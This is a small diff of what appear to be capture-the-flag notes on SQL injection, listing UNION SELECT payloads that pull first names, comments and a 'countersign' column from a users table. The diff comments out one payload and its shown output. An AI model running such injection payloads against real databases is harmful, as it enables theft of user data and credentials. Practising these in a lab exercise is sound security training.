@@ -5,10 +5,10 @@ list_images
 
 1 UNION SELECT 1, null FROM list_images;
 
-1 UNION SELECT 1, first_name FROM users;
-=>      ID: 1 UNION SELECT 1, first_name FROM users; 
-        First name: 1
-        Surname : Flag
+-- 1 UNION SELECT 1, first_name FROM users;
+-- =>      ID: 1 UNION SELECT 1, first_name FROM users; 
+--         First name: 1
+--         Surname : Flag
 
 1 UNION SELECT Commentaire, countersign FROM users WHERE user_id = 5;
 
